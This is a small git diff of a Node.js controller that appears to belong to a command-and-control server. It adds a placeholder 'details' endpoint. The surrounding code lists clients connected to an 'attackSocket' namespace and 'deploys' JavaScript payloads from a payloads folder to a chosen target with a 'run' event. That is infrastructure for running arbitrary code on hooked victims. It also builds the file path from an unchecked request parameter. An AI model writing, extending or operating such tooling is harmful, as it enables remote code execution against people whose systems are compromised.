@@ -6,6 +6,13 @@ const controller = {
   list: (req, res) => {
     res.json(Object.keys(attackSocket.of('/').connected))
   },
+  details: (req, res) => {
+    res.json({
+      id: req.params.target,
+      nickname: '',
+      connectedSince: '123'
+    })
+  },
   deploy: (req, res) => {
     let payload = fs.readFileSync(resolve('./payloads/' + req.params.payload + '.js'), { encoding: 'utf8' })
     console.log(attackSocket.of('/').connected[req.params.target].emit('run', payload))
